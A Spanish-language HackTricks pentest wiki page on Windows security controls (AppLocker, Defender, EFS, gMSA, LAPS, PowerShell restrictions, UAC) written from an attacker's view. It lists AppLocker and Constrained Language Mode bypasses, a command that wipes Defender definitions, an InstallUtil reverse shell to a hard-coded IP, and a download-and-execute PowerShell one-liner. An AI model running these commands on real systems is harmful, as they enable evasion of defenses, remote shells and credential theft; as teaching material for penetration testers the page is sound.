# Controles de seguridad de Windows

{{#include ../banners/hacktricks-training.md}}

## Política de AppLocker

Una lista blanca de aplicaciones es una lista de aplicaciones de software o ejecutables aprobados que pueden estar presentes y ejecutarse en un sistema. El objetivo es proteger el entorno frente a malware dañino y software no aprobado que no se ajuste a las necesidades empresariales específicas de una organización.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) es la **solución de lista blanca de aplicaciones** de Microsoft y proporciona a los administradores del sistema control sobre **qué aplicaciones y archivos pueden ejecutar los usuarios**. Proporciona un **control granular** sobre ejecutables, scripts, archivos del instalador de Windows, DLLs, aplicaciones empaquetadas e instaladores de aplicaciones empaquetadas.\
Es habitual que las organizaciones **bloqueen cmd.exe y PowerShell.exe** y el acceso de escritura a determinados directorios, **pero todo esto se puede omitir**.

### Comprobar

Comprueba qué archivos/extensiones están en la lista negra o en la lista blanca:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
`Test-AppLockerPolicy` evalúa archivos candidatos para una identidad específica frente a una policy de AppLocker. Prueba la cuenta cuyo token ejecutará el payload, ya que las reglas pueden dirigirse a usuarios o grupos; `Get-AppLockerFileInformation` también resulta útil para inspeccionar la ruta, el hash y los metadatos del publisher con los que pueden coincidir las reglas.<sup>[[5]](#references)</sup>
```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```
Esta ruta del registro contiene las configuraciones y políticas aplicadas por AppLocker, lo que permite revisar el conjunto actual de reglas aplicadas en el sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Carpetas escribibles** útiles para hacer Bypass de la política de AppLocker: Si AppLocker permite ejecutar cualquier cosa dentro de `C:\Windows\System32` o `C:\Windows`, hay **carpetas escribibles** que puedes usar para **hacer Bypass de esto**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Los binarios [**"LOLBAS's"**](https://lolbas-project.github.io/) **trusted** habitualmente también pueden ser útiles para evadir AppLocker.
- **Las reglas mal redactadas también podrían evadirse**
- Por ejemplo, con **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puedes crear una **carpeta llamada `allowed`** en cualquier lugar y se permitirá.
- Las organizaciones también suelen centrarse en **bloquear el ejecutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, pero olvidan las **otras** [**ubicaciones de los ejecutables de PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
- **La aplicación de reglas para DLL rara vez está habilitada** debido a la carga adicional que puede generar en un sistema y a la cantidad de pruebas necesarias para garantizar que nada deje de funcionar. Por lo tanto, usar **DLLs como backdoors ayudará a evadir AppLocker**.
- Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código de Powershell** en cualquier proceso y evadir AppLocker. Para obtener más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

Las credenciales locales están presentes en este archivo; las contraseñas están hasheadas.

### Local Security Authority (LSA) - LSASS

Las **credenciales** (hasheadas) se **guardan** en la **memoria** de este subsistema por motivos de Single Sign-On.\
**LSA** administra la **política de seguridad** local (política de contraseñas, permisos de los usuarios...), la **autenticación**, los **tokens de acceso**...\
LSA será quien **compruebe** las credenciales proporcionadas dentro del archivo **SAM** (para un inicio de sesión local) y quien **se comunique** con el **domain controller** para autenticar a un usuario del dominio.

Las **credenciales** se **guardan** dentro del **proceso LSASS**: tickets de Kerberos, hashes NT y LM y contraseñas fácilmente descifrables.

### LSA secrets

LSA podría guardar algunas credenciales en el disco:

- Contraseña de la cuenta del equipo de Active Directory (domain controller inaccesible).
- Contraseñas de las cuentas de los servicios de Windows
- Contraseñas de las tareas programadas
- Más datos (contraseña de las aplicaciones IIS...)

### NTDS.dit

Es la base de datos de Active Directory. Solo está presente en los Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) es un Antivirus disponible en Windows 10 y Windows 11, así como en versiones de Windows Server. **Bloquea** herramientas comunes de pentesting, como **`WinPEAS`**. Sin embargo, existen formas de **evadir estas protecciones**.

### Check

Para comprobar el **estado** de **Defender**, puedes ejecutar el cmdlet de PS **`Get-MpComputerStatus`** (comprueba el valor de **`RealTimeProtectionEnabled`** para saber si está activo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerarlo, también puedes ejecutar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Sistema de archivos cifrado (EFS)

EFS protege los archivos mediante cifrado, utilizando una **clave simétrica** conocida como **File Encryption Key (FEK)**. Esta clave se cifra con la **clave pública** del usuario y se almacena dentro del **alternative data stream** $EFS del archivo cifrado. Cuando se necesita descifrar el archivo, la **clave privada** correspondiente al certificado digital del usuario se utiliza para descifrar la FEK del stream $EFS. Puedes encontrar más detalles [aquí](https://en.wikipedia.org/wiki/Encrypting_File_System).

Los **escenarios de descifrado sin intervención del usuario** incluyen:

- Cuando los archivos o carpetas se mueven a un sistema de archivos que no admite EFS, como [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), se descifran automáticamente.
- Los archivos cifrados enviados por la red mediante el protocolo SMB/CIFS se descifran antes de la transmisión.

Este método de cifrado permite un **acceso transparente** a los archivos cifrados para su propietario. Sin embargo, cambiar simplemente la contraseña del propietario e iniciar sesión no permitirá descifrarlos.

**Puntos clave**:

- EFS utiliza una FEK simétrica, cifrada con la clave pública del usuario.
- El descifrado emplea la clave privada del usuario para acceder a la FEK.
- El descifrado automático ocurre bajo condiciones específicas, como copiar los archivos a FAT32 o transmitirlos por la red.
- Los archivos cifrados son accesibles para el propietario sin pasos adicionales.

### Comprobar información de EFS

Comprueba si un **usuario** ha **utilizado** este **servicio** verificando si existe esta ruta:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Comprueba **quién** tiene **acceso** al archivo usando cipher /c \<file>\
También puedes usar `cipher /e` y `cipher /d` dentro de una carpeta para **cifrar** y **descifrar** todos los archivos

### Descifrar archivos EFS

#### Siendo Authority System

Este enfoque requiere que el **usuario víctima** esté **ejecutando** un **proceso** en el host. En ese caso, desde una sesión de `meterpreter` puedes suplantar el token del proceso del usuario (`impersonate_token` de `incognito`). Como alternativa, puedes hacer `migrate` al proceso del usuario.

#### Conociendo la contraseña del usuario

Mimikatz puede importar el certificado y la clave privada del usuario y, posteriormente, utilizarlos para descifrar archivos protegidos con EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Cuentas de servicio administradas por grupos (gMSA)

Microsoft desarrolló las **Group Managed Service Accounts (gMSA)** para simplificar la gestión de las cuentas de servicio en las infraestructuras de IT. A diferencia de las cuentas de servicio tradicionales, que a menudo tienen habilitada la configuración "**Password never expire**", las gMSA ofrecen una solución más segura y fácil de administrar:

- **Gestión automática de contraseñas**: las gMSA utilizan una contraseña compleja de 240 caracteres que cambia automáticamente según la política del dominio o del equipo. Este proceso lo gestiona el Key Distribution Service (KDC) de Microsoft, eliminando la necesidad de actualizar manualmente las contraseñas.
- **Seguridad mejorada**: estas cuentas son inmunes a los bloqueos y no se pueden utilizar para inicios de sesión interactivos, lo que mejora su seguridad.
- **Compatibilidad con múltiples hosts**: las gMSA se pueden compartir entre varios hosts, por lo que son ideales para servicios que se ejecutan en varios servidores.
- **Compatibilidad con tareas programadas**: a diferencia de las managed service accounts, las gMSA permiten ejecutar tareas programadas.
- **Gestión simplificada de SPN**: el sistema actualiza automáticamente el Service Principal Name (SPN) cuando se producen cambios en los detalles sAMaccount del equipo o en su nombre DNS, lo que simplifica la gestión de SPN.

Las contraseñas de las gMSA se almacenan en la propiedad LDAP _**msDS-ManagedPassword**_ y los Domain Controllers (DCs) las restablecen automáticamente cada 30 días. Esta contraseña, un blob de datos cifrado conocido como [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), solo puede ser recuperada por administradores autorizados y por los servidores en los que están instaladas las gMSA, garantizando un entorno seguro. Para acceder a esta información, se requiere una conexión segura como LDAPS, o la conexión debe estar autenticada con 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Puedes leer esta contraseña con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Encuentra más información en esta publicación**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Además, consulta esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre cómo realizar un **NTLM relay attack** para **leer** la **contraseña** de **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Distingue entre **legacy Microsoft LAPS** y la implementación nativa de **Windows LAPS** durante la enumeración. Windows LAPS se incluyó en las actualizaciones de Windows del 11 de abril de 2023 y puede realizar una copia de seguridad de la contraseña de un administrador local administrado en **Windows Server Active Directory** o **Microsoft Entra ID**. En implementaciones respaldadas por AD, también puede cifrar contraseñas, conservar un historial de contraseñas cifradas y administrar la contraseña DSRM de un controlador de dominio. El MSI descargable de legacy está obsoleto en las versiones más recientes de Windows, aunque Windows LAPS puede funcionar en modo de emulación de legacy.<sup>[[6]](#references)</sup>

Dado que legacy Microsoft LAPS y Windows LAPS son implementaciones independientes, identifica cuál está implementada antes de aplicar ataques específicos de atributos o cmdlets. La página enlazada cubre el descubrimiento, la enumeración de ACL, la recuperación, la manipulación de la expiración y la recuperación offline sin duplicar aquí esos procedimientos.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **bloquea muchas de las funciones** necesarias para usar PowerShell de forma eficaz, como el bloqueo de objetos COM, permitir únicamente tipos .NET aprobados, flujos de trabajo basados en XAML, clases de PowerShell y mucho más.

### **Comprobar**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
En las versiones actuales de Windows, ese Bypass no funcionará, pero puedes usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilarlo, es posible que debas** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> añadir `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` y **cambiar el proyecto a .Net4.5**.

#### Bypass directo:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código de Powershell** en cualquier proceso y hacer bypass del modo restringido. Para obtener más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Directiva de ejecución de PS

De forma predeterminada, está configurada como **restringida.** Principales formas de hacer bypass de esta directiva:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Se puede encontrar más información [aquí](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Es la API que se puede utilizar para autenticar usuarios.

La SSPI se encargará de encontrar el protocolo adecuado para dos máquinas que quieren comunicarse. El método preferido para esto es Kerberos. A continuación, la SSPI negociará qué protocolo de autenticación se utilizará. Estos protocolos de autenticación se denominan Security Support Provider (SSP), se encuentran dentro de cada máquina Windows en forma de una DLL y ambas máquinas deben admitir el mismo para poder comunicarse.

### Principales SSP

- **Kerberos**: El preferido
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** y **NTLMv2**: Por motivos de compatibilidad
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Servidores web y LDAP, contraseña en forma de hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL y TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Se utiliza para negociar el protocolo que se usará (Kerberos o NTLM, siendo Kerberos el predeterminado)
- %windir%\Windows\System32\lsasrv.dll

#### La negociación podría ofrecer varios métodos o solo uno.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una funcionalidad que habilita un **aviso de consentimiento para actividades elevadas**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}



## References

- [1] [Omitir AppLocker y el modo de lenguaje restringido de PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [cómo descifrar archivos EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying para gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 formas de omitir la directiva de ejecución de PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Usar los cmdlets de Windows PowerShell de AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Descripción general de Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
{{#include ../banners/hacktricks-training.md}}
